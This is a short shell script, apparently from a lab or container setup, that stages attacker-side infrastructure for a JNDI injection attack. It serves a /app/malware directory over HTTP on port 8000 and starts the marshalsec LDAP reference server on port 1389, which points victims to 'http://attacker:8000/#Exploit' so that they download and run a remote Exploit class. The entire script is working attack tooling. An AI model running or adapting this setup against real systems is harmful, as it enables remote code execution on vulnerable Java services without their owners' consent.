#!/bin/sh

echo "[*] Run webserver HTTP on 8000..."
cd /app/malware || exit 1
python3 -m http.server 8000 &

echo "[*] Run marshalsec LDAP server on 1389..."
cd /app/marshalsec || exit 1
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://attacker:8000/#Exploit" 1389 &

# open the shell
wait
